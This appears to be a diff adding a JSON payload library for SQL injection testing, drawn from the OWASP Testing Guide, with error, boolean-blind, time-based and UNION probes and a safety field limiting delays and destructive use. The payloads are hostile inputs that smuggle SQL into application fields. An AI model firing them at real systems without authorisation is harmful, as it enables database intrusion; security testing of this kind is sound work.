@@ -1,0 +1,43 @@
+{
+  "metadata": {
+    "source": "Public SQLi payloads, OWASP Testing Guide",
+    "license": "Public Domain + CC BY-SA 4.0",
+    "date": "2026-09-18",
+    "category": "payloads",
+    "confidence": "high",
+    "provenance": "Public knowledge SQLi payloads",
+    "version": "1.0",
+    "applicable_technologies": ["web", "sql"],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
+    ]
+  },
+  "vuln_class": "sqli",
+  "payloads": [
+    {
+      "type": "witness",
+      "description": "Detect SQLi via error or behavior change",
+      "payloads": ["'", "\"", "' OR '1'='1", "' OR 1=1 --", "1' OR '1'='1"],
+      "usage": "Check for SQL error or behavior change"
+    },
+    {
+      "type": "boolean",
+      "description": "Boolean-based blind SQLi",
+      "payloads": ["' AND 1=1 --", "' AND 1=2 --", "' AND 'a'='a", "' AND 'a'='b"],
+      "usage": "Check if response differs for true vs false"
+    },
+    {
+      "type": "time",
+      "description": "Time-based blind SQLi, use minimal delay to avoid DoS",
+      "payloads": ["' AND SLEEP(2) --", "' OR SLEEP(2) --", "'; WAITFOR DELAY '0:0:2' --"],
+      "usage": "Check if response delayed, use 2 sec minimal to avoid DoS"
+    },
+    {
+      "type": "union",
+      "description": "Union-based SQLi",
+      "payloads": ["' UNION SELECT 1,2,3 --", "' UNION SELECT NULL,NULL,NULL --", "' UNION SELECT 1,2,3,4,5 --"],
+      "usage": "Check if numbers reflected, indicates union possible"
+    }
+  ],
+  "safety": "No destructive payloads like DROP TABLE without approval, minimal delay (2 sec) for time-based to avoid DoS, no data extraction beyond minimal proof"
+}
